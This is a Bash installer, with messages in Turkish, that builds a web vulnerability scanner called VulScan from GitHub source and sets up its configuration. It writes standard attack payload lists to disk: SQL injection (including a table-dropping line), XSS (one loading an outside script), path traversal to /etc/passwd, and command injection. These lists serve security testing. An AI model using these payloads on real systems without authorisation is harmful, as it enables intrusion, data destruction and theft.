#!/bin/bash

# VulScan Linux Installer v3.1.0
# Advanced Web Security Scanner
# by ATOMGAMERAGA

set -e

# Default values
VERSION=""
INSTALL_PATH="/opt/vulscan"
CREATE_DESKTOP_SHORTCUT=false
FORCE=false
QUIET=false
MANUAL_PATH=""

# Configuration paths
CONFIG_DIR="/etc/vulscan"
PAYLOADS_DIR="$CONFIG_DIR/payloads"
TEMP_DIR="/tmp/vulscan_install_$$"

# URLs for different versions
declare -A STABLE_VERSION=(
    ["url"]="https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/main.go"
    ["tag"]="v3.0-stable"
    ["desc"]="Stable Release - Kararlı sürüm"
)

declare -A DEV_VERSION=(
    ["url"]="https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/dev/main-3.0.1.go"
    ["tag"]="v3.0.1-dev"
    ["desc"]="Development Release - Geliştirme sürümü"
)

# ASCII Banner
BANNER='
 ██╗   ██╗██╗   ██╗██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
 ██║   ██║██║   ██║██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
 ██║   ██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
 ╚██╗ ██╔╝██║   ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
  ╚████╔╝ ╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
   ╚═══╝   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

               VulScan Linux Installer v3.1.0
                 Advanced Web Security Scanner
                       by ATOMGAMERAGA
'

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
NC='\033[0m' # No Color

# Function to print colored output
print_color() {
    local message="$1"
    local color="$2"
    local prefix="$3"
    
    if [[ "$QUIET" == false ]]; then
        case "$prefix" in
            "[ERROR]")   echo -e "${RED}$prefix${NC} $message" ;;
            "[WARNING]") echo -e "${YELLOW}$prefix${NC} $message" ;;
            "[SUCCESS]") echo -e "${GREEN}$prefix${NC} $message" ;;
            "[INFO]")    echo -e "${CYAN}$prefix${NC} $message" ;;
            *)           echo -e "${color}$message${NC}" ;;
        esac
    fi
}

# Function to detect Linux distribution
detect_distro() {
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        echo "$ID"
    elif [[ -f /etc/redhat-release ]]; then
        echo "rhel"
    elif [[ -f /etc/debian_version ]]; then
        echo "debian"
    else
        echo "unknown"
    fi
}

# Function to detect package manager
detect_package_manager() {
    local distro=$(detect_distro)
    
    case "$distro" in
        ubuntu|debian|kali|parrot)
            echo "apt"
            ;;
        fedora|centos|rhel|rocky|alma)
            echo "dnf"
            ;;
        arch|manjaro)
            echo "pacman"
            ;;
        opensuse*)
            echo "zypper"
            ;;
        alpine)
            echo "apk"
            ;;
        *)
            echo "unknown"
            ;;
    esac
}

# Function to install dependencies
install_dependencies() {
    local pkg_manager=$(detect_package_manager)
    local distro=$(detect_distro)
    
    print_color "Linux dağıtımı tespit edildi: $distro ($pkg_manager)" "$WHITE" "[INFO]"
    print_color "Gerekli bağımlılıklar kontrol ediliyor..." "$WHITE" "[INFO]"
    
    # Check if curl is installed
    if ! command -v curl &> /dev/null; then
        print_color "curl yükleniyor..." "$WHITE" "[INFO]"
        case "$pkg_manager" in
            apt)
                sudo apt update && sudo apt install -y curl
                ;;
            dnf)
                sudo dnf install -y curl
                ;;
            pacman)
                sudo pacman -S --noconfirm curl
                ;;
            zypper)
                sudo zypper install -y curl
                ;;
            apk)
                sudo apk add curl
                ;;
            *)
                print_color "Bilinmeyen paket yöneticisi. curl'ü manuel olarak yükleyin." "$RED" "[ERROR]"
                return 1
                ;;
        esac
    fi
    
    # Check if Go is installed
    if ! command -v go &> /dev/null; then
        print_color "Go programlama dili yükleniyor..." "$WHITE" "[INFO]"
        case "$pkg_manager" in
            apt)
                sudo apt update && sudo apt install -y golang-go
                ;;
            dnf)
                sudo dnf install -y golang
                ;;
            pacman)
                sudo pacman -S --noconfirm go
                ;;
            zypper)
                sudo zypper install -y go
                ;;
            apk)
                sudo apk add go
                ;;
            *)
                print_color "Go'yu manuel olarak yükleyin: https://golang.org/dl/" "$RED" "[ERROR]"
                return 1
                ;;
        esac
    fi
    
    # Verify Go installation
    if command -v go &> /dev/null; then
        local go_version=$(go version)
        print_color "Go bulundu: $go_version ✓" "$GREEN" "[SUCCESS]"
        return 0
    else
        print_color "Go yüklemesi başarısız!" "$RED" "[ERROR]"
        return 1
    fi
}

# Function to check if running as root
check_root() {
    if [[ $EUID -eq 0 ]]; then
        return 0
    else
        return 1
    fi
}

# Function to get user choice
get_user_choice() {
    local prompt="$1"
    local options="$2"
    local default="$3"
    local choice
    
    if [[ "$QUIET" == true && -n "$default" ]]; then
        echo "$default"
        return
    fi
    
    while true; do
        read -p "$prompt: " choice
        if [[ -z "$choice" && -n "$default" ]]; then
            echo "$default"
            return
        elif [[ " $options " =~ " $choice " ]]; then
            echo "$choice"
            return
        fi
    done
}

# Function to download and build VulScan
install_vulscan() {
    local selected_version="$1"
    local source_url="$2"
    local version_tag="$3"
    
    # Create temporary directory
    print_color "Geçici dizin oluşturuluyor..." "$WHITE" "[INFO]"
    mkdir -p "$TEMP_DIR"
    cd "$TEMP_DIR"
    
    # Download source code
    print_color "Kaynak kod indiriliyor: $source_url" "$WHITE" "[INFO]"
    if curl -L -A "VulScan-Linux-Installer/3.1.0" -o "main.go" "$source_url"; then
        print_color "Kaynak kod başarıyla indirildi ✓" "$GREEN" "[SUCCESS]"
    else
        print_color "Kaynak kod indirilemedi!" "$RED" "[ERROR]"
        return 1
    fi
    
    # Create go.mod
    print_color "Go modülü hazırlanıyor..." "$WHITE" "[INFO]"
    cat > go.mod << 'EOF'
module VulScan

go 1.19

require (
    golang.org/x/time v0.3.0
    gopkg.in/yaml.v3 v3.0.1
)
EOF
    
    # Build executable
    print_color "VulScan derleniyor..." "$WHITE" "[INFO]"
    if go mod tidy && go build -ldflags "-s -w -X main.Version=$version_tag" -o "vulscan" "main.go"; then
        print_color "Derleme başarılı ✓" "$GREEN" "[SUCCESS]"
        return 0
    else
        print_color "Derleme başarısız!" "$RED" "[ERROR]"
        return 1
    fi
}

# Function to install files
install_files() {
    local version_tag="$1"
    
    print_color "Kurulum dizinleri oluşturuluyor..." "$WHITE" "[INFO]"
    
    # Check if installation path exists
    if [[ -d "$INSTALL_PATH" ]]; then
        if [[ "$FORCE" == true ]]; then
            sudo rm -rf "$INSTALL_PATH"
        else
            local choice=$(get_user_choice "Mevcut kurulum bulundu. Üzerine yaz? (y/n)" "y n Y N" "n")
            if [[ "$choice" == "n" || "$choice" == "N" ]]; then
                print_color "Kurulum iptal edildi." "$YELLOW" "[WARNING]"
                return 1
            fi
            sudo rm -rf "$INSTALL_PATH"
        fi
    fi
    
    # Create directories
    sudo mkdir -p "$INSTALL_PATH"
    sudo mkdir -p "$CONFIG_DIR"
    sudo mkdir -p "$PAYLOADS_DIR"
    
    # Copy executable
    print_color "Dosyalar kopyalanıyor..." "$WHITE" "[INFO]"
    sudo cp "$TEMP_DIR/vulscan" "$INSTALL_PATH/vulscan"
    sudo chmod +x "$INSTALL_PATH/vulscan"
    
    # Create configuration file
    print_color "Varsayılan yapılandırma oluşturuluyor..." "$WHITE" "[INFO]"
    sudo tee "$CONFIG_DIR/config.yaml" > /dev/null << EOF
# VulScan Configuration File
# Generated by Linux Installer v3.1.0

scan:
  threads: 5
  timeout: 10
  user_agent: "VulScan/$version_tag"
  rate_limit: 10

payloads:
  sql_injection: "$PAYLOADS_DIR/sql.txt"
  xss: "$PAYLOADS_DIR/xss.txt"
  directory_traversal: "$PAYLOADS_DIR/lfi.txt"
  command_injection: "$PAYLOADS_DIR/cmd.txt"

output:
  verbose: false
  format: "json"
  report: false
EOF
    
    # Create payload files
    print_color "Payload dosyaları oluşturuluyor..." "$WHITE" "[INFO]"
    
    # SQL Injection payloads
    sudo tee "$PAYLOADS_DIR/sql.txt" > /dev/null << 'EOF'
# SQL Injection Payloads - VulScan v3.1.0
' OR '1'='1
' OR 1=1 --
' UNION SELECT NULL--
'; DROP TABLE users; --
' AND SLEEP(5) --
' OR IF(1=1,SLEEP(5),0) --
admin'--
admin' #
) or '1'='1--
) or ('1'='1--
' UNION SELECT 1,2,3,4,5,version(),7,8,9,10--
' or 1=1#
' or 1=1/*
EOF
    
    # XSS payloads
    sudo tee "$PAYLOADS_DIR/xss.txt" > /dev/null << 'EOF'
# XSS Payloads - VulScan v3.1.0
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
'><script>alert('XSS')</script>
"><script>alert('XSS')</script>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<div onmouseover="alert('XSS')">test</div>
<script src=//brutelogic.com.br/1.js></script>
EOF
    
    # Directory Traversal payloads
    sudo tee "$PAYLOADS_DIR/lfi.txt" > /dev/null << 'EOF'
# Directory Traversal / LFI Payloads - VulScan v3.1.0
../
..\
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
....\\....\\....\\windows\system32\drivers\etc\hosts
%2e%2e%2f
%2e%2e%5c
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
EOF
    
    # Command Injection payloads
    sudo tee "$PAYLOADS_DIR/cmd.txt" > /dev/null << 'EOF'
# Command Injection Payloads - VulScan v3.1.0
; ls
| id
& whoami
`id`
$(id)
; cat /etc/passwd
| type c:\windows\system32\drivers\etc\hosts
& dir
; uname -a
|| id
&& id
; ping -c 4 127.0.0.1
EOF
    
    return 0
}

# Function to add to PATH
add_to_path() {
    print_color "PATH ortam değişkeni güncelleniyor..." "$WHITE" "[INFO]"
    
    # Check if already in PATH
    if echo "$PATH" | grep -q "$INSTALL_PATH"; then
        print_color "PATH zaten güncel ✓" "$GREEN" "[SUCCESS]"
        return 0
    fi
    
    # Add to system-wide PATH
    if [[ -d "/etc/profile.d" ]]; then
        sudo tee "/etc/profile.d/vulscan.sh" > /dev/null << EOF
#!/bin/bash
# VulScan PATH configuration
export PATH="\$PATH:$INSTALL_PATH"
EOF
        sudo chmod +x "/etc/profile.d/vulscan.sh"
    fi
    
    # Add to current session PATH
    export PATH="$PATH:$INSTALL_PATH"
    
    # Try to add to user's shell profile
    local shell_profile=""
    if [[ "$SHELL" == *"bash"* ]]; then
        shell_profile="$HOME/.bashrc"
    elif [[ "$SHELL" == *"zsh"* ]]; then
        shell_profile="$HOME/.zshrc"
    elif [[ "$SHELL" == *"fish"* ]]; then
        shell_profile="$HOME/.config/fish/config.fish"
        echo "set -x PATH \$PATH $INSTALL_PATH" >> "$shell_profile"
        print_color "Fish shell yapılandırması güncellendi ✓" "$GREEN" "[SUCCESS]"
        return 0
    fi
    
    if [[ -n "$shell_profile" ]]; then
        echo "# VulScan PATH" >> "$shell_profile"
        echo "export PATH=\"\$PATH:$INSTALL_PATH\"" >> "$shell_profile"
    fi
    
    print_color "PATH başarıyla güncellendi ✓" "$GREEN" "[SUCCESS]"
    return 0
}

# Function to create shortcuts and menu entries
create_shortcuts() {
    local version_tag="$1"
    
    print_color "Menü kısayolları oluşturuluyor..." "$WHITE" "[INFO]"
    
    # Create desktop entry
    local desktop_entry="/usr/share/applications/vulscan.desktop"
    sudo tee "$desktop_entry" > /dev/null << EOF
[Desktop Entry]
Name=VulScan
Comment=Advanced Web Security Scanner
Exec=$INSTALL_PATH/vulscan
Icon=security-high
Terminal=true
Type=Application
Categories=Security;Network;
Keywords=security;scanner;vulnerability;web;
StartupNotify=false
EOF
    
    # Create desktop shortcut if requested
    if [[ "$CREATE_DESKTOP_SHORTCUT" == true ]]; then
        local desktop_dir="$HOME/Desktop"
        if [[ -d "$desktop_dir" ]]; then
            cp "$desktop_entry" "$desktop_dir/vulscan.desktop"
            chmod +x "$desktop_dir/vulscan.desktop"
            print_color "Masaüstü kısayolu oluşturuldu ✓" "$GREEN" "[SUCCESS]"
        fi
    fi
    
    # Update desktop database
    if command -v update-desktop-database &> /dev/null; then
        sudo update-desktop-database /usr/share/applications/ 2>/dev/null || true
    fi
    
    print_color "Kısayollar başarıyla oluşturuldu ✓" "$GREEN" "[SUCCESS]"
    return 0
}

# Function to create uninstaller
create_uninstaller() {
    local version_tag="$1"
    
    print_color "Kaldırma scripti oluşturuluyor..." "$WHITE" "[INFO]"
    
    sudo tee "$INSTALL_PATH/uninstall.sh" > /dev/null << 'EOF'
#!/bin/bash

# VulScan Uninstaller
# Generated by Linux Installer v3.1.0

echo -e "\033[0;31mVulScan Uninstaller\033[0m"
echo -e "\033[0;31m==================\033[0m"
echo ""

read -p "VulScan'i kaldırmak istediğinizden emin misiniz? (y/n): " confirm
if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    echo -e "\033[0;33mKaldırma iptal edildi.\033[0m"
    exit 0
fi

echo ""
echo -e "\033[0;36m[INFO] VulScan kaldırılıyor...\033[0m"

# Remove installation directory
sudo rm -rf "INSTALL_PATH_PLACEHOLDER"

# Remove configuration directory
sudo rm -rf "CONFIG_DIR_PLACEHOLDER"

# Remove from PATH
sudo rm -f /etc/profile.d/vulscan.sh

# Remove desktop entries
sudo rm -f /usr/share/applications/vulscan.desktop
rm -f "$HOME/Desktop/vulscan.desktop" 2>/dev/null || true

# Update desktop database
if command -v update-desktop-database &> /dev/null; then
    sudo update-desktop-database /usr/share/applications/ 2>/dev/null || true
fi

echo -e "\033[0;32m[SUCCESS] VulScan başarıyla kaldırıldı!\033[0m"
echo -e "\033[0;36m[INFO] Yeni terminal oturumu açarak PATH değişikliklerini uygulayın.\033[0m"

read -p "Çıkmak için Enter'a basın..."
EOF
    
    # Replace placeholders
    sudo sed -i "s|INSTALL_PATH_PLACEHOLDER|$INSTALL_PATH|g" "$INSTALL_PATH/uninstall.sh"
    sudo sed -i "s|CONFIG_DIR_PLACEHOLDER|$CONFIG_DIR|g" "$INSTALL_PATH/uninstall.sh"
    sudo chmod +x "$INSTALL_PATH/uninstall.sh"
    
    return 0
}

# Function to test installation
test_installation() {
    print_color "Kurulum testi yapılıyor..." "$WHITE" "[INFO]"
    
    if "$INSTALL_PATH/vulscan" --version &>/dev/null; then
        print_color "✅ Test başarılı!" "$GREEN" "[SUCCESS]"
        return 0
    else
        print_color "⚠️ Test başarısız - Manuel kontrol gerekli" "$YELLOW" "[WARNING]"
        return 1
    fi
}

# Function to clean temporary files
clean_temp_files() {
    if [[ -d "$TEMP_DIR" ]]; then
        rm -rf "$TEMP_DIR"
        print_color "Geçici dosyalar temizlendi ✓" "$GREEN" "[SUCCESS]"
    fi
}

# Function to show usage
show_usage() {
    echo "VulScan Linux Installer v3.1.0"
    echo ""
    echo "Kullanım: $0 [SEÇENEKLER]"
    echo ""
    echo "Seçenekler:"
    echo "  -v, --version VERSION     Kurulacak sürüm (stable/dev/manual)"
    echo "  -p, --path PATH          Kurulum dizini (varsayılan: /opt/vulscan)"
    echo "  -d, --desktop-shortcut   Masaüstü kısayolu oluştur"
    echo "  -f, --force              Mevcut kurulumun üzerine yaz"
    echo "  -q, --quiet              Sessiz kurulum"
    echo "  -m, --manual PATH        Manuel .exe dosyası yolu"
    echo "  -h, --help               Bu yardım mesajını göster"
    echo ""
    echo "Örnekler:"
    echo "  $0                       # İnteraktif kurulum"
    echo "  $0 -v stable -d          # Stable sürüm + masaüstü kısayolu"
    echo "  $0 -v dev -p ~/vulscan   # Dev sürüm + özel dizin"
    echo "  $0 -f -q                 # Zorla + sessiz kurulum"
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--version)
            VERSION="$2"
            shift 2
            ;;
        -p|--path)
            INSTALL_PATH="$2"
            shift 2
            ;;
        -d|--desktop-shortcut)
            CREATE_DESKTOP_SHORTCUT=true
            shift
            ;;
        -f|--force)
            FORCE=true
            shift
            ;;
        -q|--quiet)
            QUIET=true
            shift
            ;;
        -m|--manual)
            VERSION="manual"
            MANUAL_PATH="$2"
            shift 2
            ;;
        -h|--help)
            show_usage
            exit 0
            ;;
        *)
            echo "Bilinmeyen parametre: $1"
            show_usage
            exit 1
            ;;
    esac
done

# Main installation process
main() {
    # Cleanup on exit
    trap clean_temp_files EXIT
    
    if [[ "$QUIET" == false ]]; then
        clear
        echo -e "${CYAN}$BANNER${NC}"
    fi
    
    # Check if running as root
    if ! check_root; then
        print_color "Bu installer root hakları gerektirir!" "$RED" "[ERROR]"
        print_color "Lütfen 'sudo $0' komutu ile çalıştırın." "$RED" "[ERROR]"
        exit 1
    fi
    
    print_color "Root hakları doğrulandı ✓" "$GREEN" "[SUCCESS]"
    
    # Install dependencies
    if ! install_dependencies; then
        print_color "Bağımlılık yüklemesi başarısız!" "$RED" "[ERROR]"
        exit 1
    fi
    
    # Version selection
    if [[ -z "$VERSION" ]]; then
        if [[ "$QUIET" == false ]]; then
            echo -e "${YELLOW}══════════════════════════════════════════════════════════════════${NC}"
            echo -e "${YELLOW}                         SÜRÜM SEÇİMİ${NC}"
            echo -e "${YELLOW}══════════════════════════════════════════════════════════════════${NC}"
            echo ""
            echo -e "${WHITE}Hangi sürümü kurmak istiyorsunuz?${NC}"
            echo ""
            echo -e "${GREEN}[1] Stable Release (v3.0) - Kararlı sürüm${NC}"
            echo -e "${GRAY}    └─ Ana geliştirme dalı, test edilmiş ve kararlı${NC}"
            echo ""
            echo -e "${YELLOW}[2] Development Release (v3.0.1-dev) - Geliştirme sürümü${NC}"
            echo -e "${GRAY}    └─ Yeni özellikler, güncel güncellemeler${NC}"
            echo ""
            echo -e "${CYAN}[3] Manuel Kurulum - Kendi binary dosyanızı kullanın${NC}"
            echo ""
        fi
        
        local choice=$(get_user_choice "Seçiminizi yapın (1/2/3)" "1 2 3" "1")
        
        case "$choice" in
            "1") VERSION="stable" ;;
            "2") VERSION="dev" ;;
            "3") VERSION="manual" ;;
        esac
    fi
    
    local selected_version_tag=""
    
    if [[ "$VERSION" == "manual" ]]; then
        print_color "Manuel kurulum seçildi" "$CYAN" "[INFO]"
        
        if [[ -n "$MANUAL_PATH" ]]; then
            if [[ ! -f "$MANUAL_PATH" ]]; then
                print_color "Manuel dosya bulunamadı: $MANUAL_PATH" "$RED" "[ERROR]"
                exit 1
            fi
        else
            echo -e "${WHITE}Lütfen vulscan binary dosyasının tam yolunu girin:${NC}"
            read -p "Dosya yolu: " MANUAL_PATH
            
            if [[ ! -f "$MANUAL_PATH" ]]; then
                print_color "Manuel dosya bulunamadı: $MANUAL_PATH" "$RED" "[ERROR]"
                exit 1
            fi
        fi
        
        # Copy manual binary to temp directory
        mkdir -p "$TEMP_DIR"
        cp "$MANUAL_PATH" "$TEMP_DIR/vulscan"
        chmod +x "$TEMP_DIR/vulscan"
        selected_version_tag="v3.0-manual"
    else
        local source_url=""
        local version_desc=""
        
        if [[ "$VERSION" == "stable" ]]; then
            source_url="${STABLE_VERSION[url]}"
            selected_version_tag="${STABLE_VERSION[tag]}"
            version_desc="${STABLE_VERSION[desc]}"
        elif [[ "$VERSION" == "dev" ]]; then
            source_url="${DEV_VERSION[url]}"
            selected_version_tag="${DEV_VERSION[tag]}"
            version_desc="${DEV_VERSION[desc]}"
        fi
        
        print_color "$version_desc seçildi" "$GREEN" "[SUCCESS]"
        
        # Download and build
        if ! install_vulscan "$VERSION" "$source_url" "$selected_version_tag"; then
            exit 1
        fi
    fi
    
    # Install files
    if ! install_files "$selected_version_tag"; then
        exit 1
    fi
    
    # Add to PATH
    add_to_path
    
    # Create shortcuts
    create_shortcuts "$selected_version_tag"
    
    # Create uninstaller
    create_uninstaller "$selected_version_tag"
    
    # Test installation
    test_installation
    
    # Success message
    if [[ "$QUIET" == false ]]; then
        echo ""
        echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}                      KURULUM TAMAMLANDI!${NC}"
        echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${GREEN}✅ VulScan başarıyla kuruldu!${NC}"
        echo ""
        echo -e "${WHITE}📁 Kurulum dizini: $INSTALL_PATH${NC}"
        echo -e "${WHITE}⚙️  Yapılandırma: $CONFIG_DIR/config.yaml${NC}"
        echo -e "${WHITE}🎯 Payloadlar: $PAYLOADS_DIR/${NC}"
        echo ""
        echo -e "${YELLOW}🚀 KULLANIM ÖRNEKLERİ:${NC}"
        echo -e "${GRAY}────────────────────────────────────────────────────────────────${NC}"
        echo -e "${CYAN}  vulscan http://example.com${NC}"
        echo -e "${CYAN}  vulscan --help${NC}"
        echo -e "${CYAN}  vulscan --verbose http://example.com/page.php?id=1${NC}"
        echo -e "${CYAN}  vulscan --output report.json --report http://example.com${NC}"
        echo ""
        echo -e "${YELLOW}💡 İPUCU: Yeni terminal oturumu açarak komutları kullanmaya başlayın!${NC}"
        echo ""
        echo -e "${WHITE}🗑️  Kaldırmak için: $INSTALL_PATH/uninstall.sh${NC}"
        echo ""
        echo -e "${GREEN}Kurulum tamamlandı! Yeni terminal açarak 'vulscan --help' komutunu deneyin.${NC}"
    fi
    
    exit 0
}

# Run main function
main "$@"
